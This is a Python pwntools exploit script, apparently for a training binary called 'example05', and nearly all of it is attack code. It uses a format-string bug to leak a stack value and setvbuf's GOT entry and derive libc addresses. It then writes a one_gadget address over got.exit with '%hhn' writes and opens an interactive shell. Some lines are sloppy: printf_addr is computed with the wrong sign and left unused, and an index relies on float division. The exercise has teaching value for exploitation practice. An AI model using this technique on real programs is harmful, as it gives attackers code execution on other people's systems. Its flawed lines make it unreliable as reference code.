from pwn import *  # NOQA
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./example05')
gdb.attach(p)

p.sendline('%7$p')
p.recvuntil('Hello ')
line = p.recvline()
random_num = str(int(line[2:10], 16))
p.sendline(random_num)

# p.sendline('AAAAAAAA %8$p') # Prints our input as a pointer.
binary = ELF('./example05')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget_offset = 0x10a45c

# Note that null bytes will be read, but not printed.

print(hex(binary.symbols['got.setvbuf']))
p.sendline(b'%9$s    ' + p64(binary.symbols['got.setvbuf']))  # Leak my input

leak = p.recvuntil(b'    ')[:-4]
p.recv()
setvbuf_addr = u64(leak.ljust(8, b'\x00'))
print('setvbuf', hex(setvbuf_addr))

libc_base = setvbuf_addr - libc.symbols['setvbuf']
printf_addr = libc_base - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
onegadget_addr = libc_base + one_gadget_offset
print('libc base', hex(libc_base))
print('system', hex(system_addr))
print('one_gadget', hex(onegadget_addr))

# fmtstr_payload() pwntools also nice.

for i in range(6):
    print(p64(onegadget_addr)[i])

payload = ""
for i in range(6):
    payload += "%" + str(p64(onegadget_addr)[i]) + "c%{}$hhn" + "%" + str(0x100 - p64(onegadget_addr)[i]) + "c"
while len(payload) % 8 != 0:
    payload += 'A'

addresses = b"".join([p64(binary.symbols['got.exit'] + i) for i in range(6)])
start_idx = 8 + len(payload) / 8
full_payload = bytes(payload.format(*[str(int(start_idx + i)) for i in range(6)]), 'utf8') + addresses
print(full_payload)
print(len(full_payload))

p.sendline(full_payload)


p.interactive()
